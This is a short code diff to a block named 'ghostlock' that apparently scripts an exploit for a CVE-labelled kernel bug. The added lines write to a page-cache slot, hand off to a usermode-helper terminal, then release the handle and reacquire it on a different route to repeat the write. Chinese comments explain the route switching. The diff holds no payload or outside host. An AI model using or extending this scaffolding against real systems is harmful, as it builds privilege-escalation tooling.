@@ -45,6 +45,11 @@ ghostlock {
         local p = backend("cve_2026_43284")
         p:writeop{ target = "pagecache_slot", value = 1, width = 8 }
         p:handoff{ terminal = "umh_forward" }
+
+        -- 中途换路（方案 2：clean 句柄 + 重新 acquire）——route 只在 acquire 给，无「切换」动词
+        close(p)                                        -- 释放旧句柄（generation 递增，旧句柄失效）
+        local p2 = backend("cve_2026_43284", { route = "select_stack" })
+        p2:writeop{ target = "pagecache_slot", value = 1, width = 8 }
         -- 收尾同上：由 Kotlin 在 resolve 后作为输入传入；本档不定义命令内容
       ]==]
     },
